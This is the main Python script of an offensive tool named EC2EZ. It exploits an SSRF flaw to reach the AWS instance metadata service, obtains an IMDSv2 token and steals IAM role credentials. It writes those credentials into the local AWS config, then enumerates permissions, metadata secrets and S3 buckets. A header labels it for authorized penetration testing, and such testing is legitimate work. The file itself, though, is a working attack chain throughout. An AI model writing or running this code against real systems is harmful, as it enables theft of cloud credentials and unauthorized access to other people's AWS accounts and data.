#!/usr/bin/env python3
"""
EC2EZ - AWS IMDSv2 Exploitation Tool (Python Edition)

AUTHORIZED SECURITY TESTING ONLY
This tool is for penetration testing with written permission
"""

import sys
import argparse
from src.config import CONFIG
from src.utils import (
    display_banner,
    log_separator,
    log_info,
    log_success,
    log_error,
    extract_ssrf_param
)
from src.imds import (
    test_ssrf_vulnerability,
    fetch_imdsv2_token,
    fetch_all_iam_roles,
    fetch_credentials,
    write_aws_credentials,
    enumerate_imds_recursive
)
from src.aws import AWSClient
from src.permissions import discover_permissions
from src.s3discovery import extract_s3_references, test_s3_access, scan_metadata_for_secrets
from src.interactive import run_interactive_menu
from src.summary import SessionSummary


def main():
    """Main execution flow"""

    # Parse arguments
    parser = argparse.ArgumentParser(
        description='EC2EZ - AWS IMDSv2 Exploitation Tool',
        epilog='Example: python3 ec2ez.py http://vulnerable.com/proxy?url='
    )
    parser.add_argument('url', help='SSRF proxy URL')
    parser.add_argument('--no-interactive', action='store_true', help='Skip interactive menu')

    args = parser.parse_args()

    # Initialize
    display_banner()
    summary = SessionSummary()

    # Extract SSRF parameter
    ssrf_param = extract_ssrf_param(args.url)
    CONFIG.update_ssrf_param(ssrf_param)

    # Build proxy URL base
    separator = '&' if '?' in args.url else '?'
    proxy_url = f"{args.url}{separator}{ssrf_param}=" if not args.url.endswith('=') else args.url

    # Step 1: Test SSRF
    if not test_ssrf_vulnerability(proxy_url):
        log_error("SSRF vulnerability not detected. Exiting.")
        return 1

    log_separator()

    # Step 2: Get IMDSv2 token
    token = fetch_imdsv2_token(proxy_url)
    if not token:
        log_error("Failed to obtain IMDSv2 token. Exiting.")
        return 1

    summary.set_token(token)
    log_separator()

    # Step 3: Enumerate IAM roles
    roles = fetch_all_iam_roles(proxy_url, token)
    if not roles:
        log_error("No IAM roles found. Exiting.")
        return 1

    log_separator()

    # Step 4: Extract credentials for first role
    credentials = fetch_credentials(proxy_url, token, roles[0])
    if not credentials:
        log_error("Failed to extract credentials. Exiting.")
        return 1

    log_separator()

    # Step 5: Enumerate IMDS metadata
    log_info("Enumerating IMDS metadata...")
    metadata = enumerate_imds_recursive(proxy_url, token)
    summary.set_metadata_count(len(metadata))
    log_success(f"✓ Discovered {len(metadata)} metadata entries")

    # Scan for secrets
    secrets = scan_metadata_for_secrets(metadata)
    summary.set_secrets_count(len(secrets))

    log_separator()

    # Step 6: Write credentials to ~/.aws
    write_aws_credentials(
        credentials['AccessKeyId'],
        credentials['SecretAccessKey'],
        credentials['Token'],
        CONFIG.AWS_DEFAULT_REGION
    )

    log_separator()

    # Step 7: Validate credentials
    aws_client = AWSClient()
    validation = aws_client.validate_credentials()

    summary.set_credentials(credentials, validation)

    if not validation['valid']:
        log_error("Credentials validation failed. Exiting.")
        return 1

    log_separator()

    # Step 8: Discover permissions
    permissions = discover_permissions()
    summary.set_permissions(permissions)

    log_separator()

    # Step 9: Test S3 access
    log_info("Testing S3 access...")
    buckets = test_s3_access()
    summary.add_s3_buckets(buckets)

    log_separator()

    # Step 10: Display summary
    summary.display()

    # Step 11: Interactive menu
    if not args.no_interactive:
        run_interactive_menu(permissions)

    log_success("\n✓ EC2EZ completed successfully")
    return 0


if __name__ == '__main__':
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        log_error("\n\nInterrupted by user")
        sys.exit(130)
    except Exception as e:
        log_error(f"\nUnexpected error: {str(e)}")
        sys.exit(1)
